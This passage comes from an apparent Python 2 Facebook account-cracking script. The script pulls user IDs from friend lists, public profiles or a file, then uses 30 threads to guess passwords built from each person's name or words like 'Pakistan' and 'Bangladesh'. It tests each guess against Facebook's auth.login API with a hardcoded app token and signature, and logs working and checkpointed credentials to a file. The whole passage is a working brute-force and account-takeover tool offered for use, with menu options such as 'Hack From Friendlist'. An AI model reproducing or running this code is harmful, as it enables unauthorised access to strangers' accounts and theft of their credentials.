                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Pakistan'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Pakistan123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mDone ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mcopy or copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mBack\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo7
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack From Friendlist'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack From Public Friends List'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack File File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_bangla()


def pilih_bangla():
    teak = raw_input('\x1b[1;96mWhich Choice Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Choose the wrong one...!'
        pilih_bangla()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo18
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo18
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idb = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Name \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / Friend wrong!'
                raw_input('\n\x1b[1;96m{\x1b[1;97m<Back>\x1b[1;96m}')
                crack_bangla()
            except requests.exceptions.ConnectionError:
                print '{!} There is no internet connection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo18
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Name File \x1b[1;91m:\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist !'
                    raw_input('\n\x1b[1;96m{\x1b[1;97m<Back>\x1b[1;96m}')
                    crack_bangla()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Choose the wrong one..!'
                pilih_bangla()
            print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Stop Token CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Cracker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode for 5 Seconds'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Name     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Bangladesh'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Bangladesh123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
